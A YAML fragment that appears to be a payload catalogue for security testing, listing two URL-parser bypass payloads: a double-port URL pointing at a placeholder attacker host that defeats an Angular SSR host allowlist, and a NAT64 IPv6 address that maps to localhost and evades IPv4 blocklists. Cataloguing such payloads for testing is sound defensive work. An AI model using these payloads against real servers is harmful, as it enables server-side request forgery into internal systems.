  - id: "modern-001"
    name: "Double-port parser differential (Angular SSR)"
    category: "modern"
    payload: "http://{{ATTACKER}}:80:80/path"
    description: >
      WHATWG URL.canParse returns false, Domino resolves to attacker:80.
      Bypasses Angular SSR host allowlist (CVE-2026-50168).
    tags: ["modern", "parser-differential", "angular", "2026"]
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-50168"]
    severity_hint: "critical"

  - id: "modern-002"
    name: "IPv6 NAT64 transition bypass"
    category: "modern"
    payload: "http://[64:ff9b::7f00:1]:8080/"
    description: >
      NAT64 prefix mapping to 127.0.0.1 — bypasses IPv4-only blocklists.
      Active in CVE-2026-32594, CVE-2026-81678, CVE-2026-53754.
    tags: ["modern", "ipv6", "nat64", "2026"]
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-32594"]
